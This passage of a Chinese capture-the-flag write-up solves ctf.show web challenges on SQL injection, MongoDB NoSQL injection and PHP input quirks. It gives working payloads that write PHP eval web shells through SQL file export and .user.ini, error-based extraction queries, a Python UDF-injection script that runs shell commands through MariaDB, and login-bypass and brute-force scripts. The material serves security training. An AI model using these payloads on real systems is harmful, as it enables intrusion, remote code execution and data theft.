class="line"></span><br><span class="line">`FIELDS TERMINATED BY &#x27;字符串&#x27;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br><span class="line"></span><br><span class="line">`FIELDS ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS OPTIONALLY ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS ESCAPED BY &#x27;字符&#x27;`：设置转义字符，只能为单个字符。默认值为“\”。</span><br><span class="line"></span><br><span class="line">`LINES STARTING BY &#x27;字符串&#x27;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class="line"></span><br><span class="line">`LINES TERMINATED BY &#x27;字符串&#x27;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>FIELDS TERMINATED BY</li><li>LINES STARTING BY</li><li>LINES TERMINATED BY</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=1.php&#x27; fields terminated by &#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure><p>接着访问dump&#x2F;1.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131756459.png" alt="image-20220409131756459"></p><h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131947051.png" alt="image-20220409131947051"></p><p>有index.php,上传.user.ini,不过要注意一下上传的格式</p><p>过滤了php，那么使用.user.ini进行文件包含，传入一个图片马，再使index.php包含图片马即可。具体操作如下：<br>先上传.user.ini(其中在每行开头加了;用于注释掉从表ctfshow_user中读出的内容)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=.user.ini&#x27; LINES STARTING BY &#x27;;&#x27; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d7a662e6a70670a#</span><br></pre></td></tr></table></figure><p>.user.ini的结果类似于：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132736975.png" alt="image-20220409132736975"></p><p>再上传图片马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=zf.jpg&#x27; lines starting by &#x27;&lt;?=eval($_POST[zf]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure><h1 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132921712.png" alt="image-20220409132921712"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409132917871.png" alt="image-20220409132917871"></p><p>extractvalue()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>updatexml()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(database())),1) -- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>floor()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>ceil()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>round()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,round(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>都试一下咯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模板</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,([])),1) -- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;)),1) -- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">数据 分开读</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(select left(flag,30) from ctfshow_flag)),1) -- #&amp;page=1&amp;limit=10ctfshow&#123;35d09f15-bd71-4970-90c</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(select right(flag,27) from ctfshow_flag)),1) -- #&amp;page=1&amp;limit=10d71-4970-90ca-56b17f14ccb0&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135233790.png" alt="image-20220409135233790"></p><h1 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135326914.png" alt="image-20220409135326914"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模板</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,([]),0x7e))-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;),0x7e))-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">数据 分开读</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select left(flag1,30) from ctfshow_flagsa),0x7e))-- #&amp;page=1&amp;limit=10ctfshow&#123;1232f3e3-1688-483c-a48</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e))-- #&amp;page=1&amp;limit=103-1688-483c-a483-990657e35c81&#125;</span><br></pre></td></tr></table></figure><h1 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409135940440.png" alt="image-20220409135940440"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模板</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,([]),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27; limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select flag2 from ctfshow_flags),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h1 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409140732039.png" alt="image-20220409140732039"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,round(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模板</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,([]),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27; limit 1,1),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select `flag?` from ctfshow_flagsa),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>可以看到这个字段名<code>flag?</code>加了反引号，原因是：表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字段.表名、字段名、数据库名等可用反引号 ( &#96; )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错</p><h1 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h1><h2 id="udf注入"><a href="#udf注入" class="headerlink" title="udf注入"></a>udf注入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#参考脚本</span></span><br><span class="line"><span class="comment">#环境：Linux/MariaDB</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080/api/?id=&#x27;</span></span><br><span class="line">code=<span class="string">&#xx27;</span></span><br><span class="line">codes=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(code),<span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i+<span class="number">128</span>,<span class="built_in">len</span>(code))])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#建临时表</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#清空临时表</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#插入第一段数据</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[<span class="number">0</span>])</span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#更新连接剩余数据</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(codes)):</span><br><span class="line">    sql=<span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[k])</span><br><span class="line">    payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">    requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#10.3.18-MariaDB    </span></span><br><span class="line"><span class="comment">#写入so文件</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#引入自定义函数</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#命令执行，结果更新到界面</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.her?&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#查看结果</span></span><br><span class="line">r=requests.get(url[:-<span class="number">4</span>]+<span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h1><h2 id="nosql"><a href="#nosql" class="headerlink" title="nosql"></a>nosql</h2><p><a href="http://rui0.cn/archives/609">NoSQL注入小笔记</a></p><p><a href="https://www.anquanke.com/post/id/97211">冷门知识 — NoSQL注入知多少</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$gt : &gt;</span><br><span class="line">$lt : &lt;</span><br><span class="line">$gte: &gt;=</span><br><span class="line">$lte: &lt;=</span><br><span class="line">$ne : !=、&lt;&gt;</span><br><span class="line">$in : in</span><br><span class="line">$nin: not in</span><br><span class="line">$all: all </span><br><span class="line">$or:or</span><br><span class="line">$not: 反匹配(1.3.3及以上版本)</span><br><span class="line">模糊查询用正则式：db.customer.find(&#123;&#x27;name&#x27;: &#123;&#x27;$regex&#x27;:&#x27;.*s.*&#x27;&#125; &#125;)</span><br><span class="line">/**</span><br><span class="line">* : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;</span><br><span class="line">* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;</span><br><span class="line">* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;</span><br><span class="line">*/</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//查询age = 22的记录</span><br><span class="line">db.userInfo.find(&#123;&quot;age&quot;: 22&#125;);</span><br><span class="line">//相当于：select * from userInfo where age = 22;</span><br><span class="line">//查询age &gt; 22的记录</span><br><span class="line">db.userInfo.find(&#123;age: &#123;$gt: 22&#125;&#125;);</span><br><span class="line">//相当于：select * from userInfo where age &gt; 22;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144401500.png" alt="image-20220409144401243"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144445953.png" alt="image-20220409144445953"></p><p>这题后端对id过滤了非数字，可能用的intval函数。这个函数在PHP特性那里出现过很多次了，利用这个特性：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144506190.png" alt="image-20220409144506190"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id[]=flag</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144557902.png" alt="image-20220409144557902"></p><h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144722019.png" alt="image-20220409144722019"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  $query = new MongoDB\Driver\Query($data);</span><br><span class="line">  $cursor = $manager-&gt;executeQuery(&#x27;ctfshow.ctfshow_user&#x27;, $query)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">//无过滤</span><br><span class="line">  if(count($cursor)&gt;0)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">    array_push($ret[&#x27;data&#x27;], $flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>没有任何的过滤，利用<code>$ne</code>就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><p>正则也可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$regex]=.*&amp;password[$regex]=.*</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150349590.png" alt="image-20220409150349590"></p><h1 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150536078.png" alt="image-20220409150536078"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150527537.png" alt="image-20220409150527537"></p><p>这次返回的是admin 的密码</p><p>改成username不等于admin</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150627591.png" alt="image-20220409150627591"></p><h1 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151108797.png" alt="image-20220409151108797"></p><p>username既不能是admin，也不能是admin1，那就正则表达式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$regex]=^[^a].*$&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151155741.png" alt="image-20220409151155741"></p><h1 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151505085.png" alt="image-20220409151505085"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongodb的find().pretty()方法的作用。</span><br><span class="line">使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author : feng</span></span><br><span class="line"><span class="string">Time : 2021-2-14</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://2184e9b4-619a-43dd-b8de-015a6a74fe3d.chall.ctf.show:8080/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#125;&quot;</span>:</span><br><span class="line">        payload=<span class="string">&quot;^&#123;&#125;.*$&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username[$regex]&#x27;</span>:<span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password[$regex]&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u767b\u9646\u6210\u529f&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考</p><p><a href="https://ego00.blog.csdn.net/">bfengj</a></p><p><a href="https://y4tacker.blog.csdn.net/">Y4tacker</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP特性</title>
      <link href="/ctfshow/ctf.show/PHP%E7%89%B9%E6%80%A7/"/>
      <url>/ctfshow/ctf.show/PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262137710.png" alt="image-20220326213708674"></p><p>源码开局</p><p>intval()函数用于获取变量的整数值</p><p>intval()函数通过使用指定的进制base转换(默认是十进制)返回变量var的integer数值.intval()不能用于object,否则会产生E_NOTICE错误并返回1</p><p>preg_match()函数:判断输入的值是否存在指定字符</p><p>preg_match()函数无法处理数组,这里发现匹配到数字就死,但是intval()中又必须是数字,所以只能有一个不执行.那么要利用intval的话只能上面不执行,所以只要传个数组</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262147089.png" alt="image-20220326214706034"></p><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 16:06:11</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=4476a弱类型</span><br><span class="line">?num=0x117c十六进制</span><br><span class="line">?num=4476.0小数点</span><br><span class="line">?num=+4476正负号</span><br><span class="line">?num=4476e1科学计数法</span><br><span class="line">?num=010574八进制</span><br><span class="line">?num= 010574八进制加空格</span><br></pre></td></tr></table></figure><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-18 16:16:09</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>m表示匹配多行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=11%0aphp</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403222600621.png" alt="image-20220403222600621"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i</span><br><span class="line">不区分大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配,若存在换行\n并且有开始^或结束$符的情况下,将以换行为分隔符,逐行进行匹配</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">特殊字符圆点.中包含换行符.默认的圆点.是匹配除换行符\n之外的任何单字符,加上s之后,.包含换行符</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">强制从目标字符串开头匹配</span><br><span class="line"></span><br><span class="line">D</span><br><span class="line">如果使用$限制结束字符,则不允许结尾有换行符</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">配合函数preg_replace()使用,可以把匹配来的字符串当作正则表达式来执行</span><br></pre></td></tr></table></figure><h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 